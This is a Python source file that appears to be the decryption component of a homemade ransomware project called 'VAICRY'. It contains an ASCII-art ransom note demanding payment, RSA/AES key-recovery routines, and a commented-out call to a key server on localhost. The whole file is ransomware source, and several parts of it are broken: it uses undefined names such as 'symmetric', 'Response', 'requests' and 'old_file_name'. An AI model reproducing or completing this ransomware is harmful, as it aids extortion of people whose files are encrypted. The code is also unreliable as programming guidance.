import base64
import string 
import random
import sys
import time
import os
import pickle
import sym
import servkey

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


ransom_message = """
____   _________  .___________________________.___.
\   \ /   /  _  \ |   \_   ___ \______   \__  |   |
 \   Y   /  /_\  \|   /    \  \/|       _//   |   |
  \     /    |    \   \     \___|    |   \\____   |
   \___/\____|__  /___|\______  /____|_  // ______|
                \/            \/       \/ \/       

All your files have been encrypted. Why cry though when you can get them back by paying
a small fee!
Will you pay the ransom? (y/n)
"""
def decrypt_private_key(enc,private_key):
    key = RSA.importKey(private_key)
    cipher = PKCS1_OAEP.new(key)
    try:
        decrypted = ""
        for i in enc:
            ciphertext = cipher.decrypt(i)
            decrypted += ciphertext
    except:
        print("Invalid private key")
        return 0
    return Response(decrypted)

def decrypt_aes_keys(enc, key):
    key_obj = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key_obj)
    return cipher.decrypt(enc)

def send_key_to_server(private_encrypted_key):
    try:
        ret = requests.post("http://127.0.0.1:8000", data=private_encrypted_key)
    except Exception as e:
        raise e

    print("Client private key decrypted")

    private_key = ret.text
    return str(private_key)

def payment():
    print(ransom_message)

def start_decryption():
    print("Importing the encrypted client private key...")
    with open(servkey.client_private_key_path, 'rb') as f:
        client_pr_key = pickle.load(f)

    try:
        with open(servkey.encrypted_aes_key_and_paths_path, 'rb') as f:
            aes_keys_and_files = pickle.load(f)
    except IOError:
        print("AES keys not found. Try a different path")
        sys.exit(-1)

    try:
        with open(servkey.enc_client_private_key_path, 'rb') as f:
            encrypted_client_private_key = pickle.load(f)
    except IOError:
        print("Encrypted client private key not found, try a different path.")
        sys.exit(-1)

#////////////////////////////////////////////////////

    print("Sending key to server")
    #key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
    #key_to_be_sent = str(encrypted_client_private_key)

    # send to server to be decrypted
    #try:
        #print("Requesting to server to decrypt the private key")
        #client_private_key = send_key_to_server(key_to_be_sent)
    #except:
        #print("No connection, try again later.")
        #sys.exit(-1)
    client_private_key = decrypt_private_key(encrypted_client_private_key,servkey.server_private_key)
    print(client_private_key)
    # saving to disk the private key
    print("Client private key decrypted and stored.")
    with open('/home/vaibhav/Desktop/Keys and Stuff/client_private_key', 'wb') as f:
        f.write(client_private_key)

    # GET THE AES KEYS and path
    try:
        with open(servkey.encrypted_aes_key_and_paths_path, 'rb') as f:
            aes_keys_and_files = pickle.load(f)
    except IOError:
        print("AES keys not found. Try a different path")
        sys.exit(-1)

    # get the aes keys and IV's and paths back
    print('Decrypting the files...')
    aes_and_path = []
    for pair in aes_keys_and_files:
        encrypted_aes_key = pair[0]
        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)

        aes_and_path.append((aes_key, pair[1]))

    for i in aes_and_path:
        decryptor = symmetric.AESCipher(i[0])
        
        with open(i[1], 'rb') as f:
            encrypted_file_content = f.read()
        
        # decrypt content
        decrypted_file_content = decryptor.decrypt(encrypted_file_content)

        original_file_name = i[1].replace(".VAICRY", "")
        with open(old_file_name, 'w') as f:
            f.write(decrypted_file_content)
        
        # delete old encrypted file
        os.remove(i[1])

    # end of decryptor
    print("Decryption finished! Congratulations!")


#ransomware_name = ("gonnacry")
server_address = ("http://localhost:8000")
#home = enviroment.get_home_path()
#desktop = enviroment.get_desktop_path()
#username = enviroment.get_username()
#ransomware_path = os.path.join(home, ransomware_name)
#machine_id = enviroment.get_unique_machine_id()

if __name__ == "__main__": 
    start_decryption()


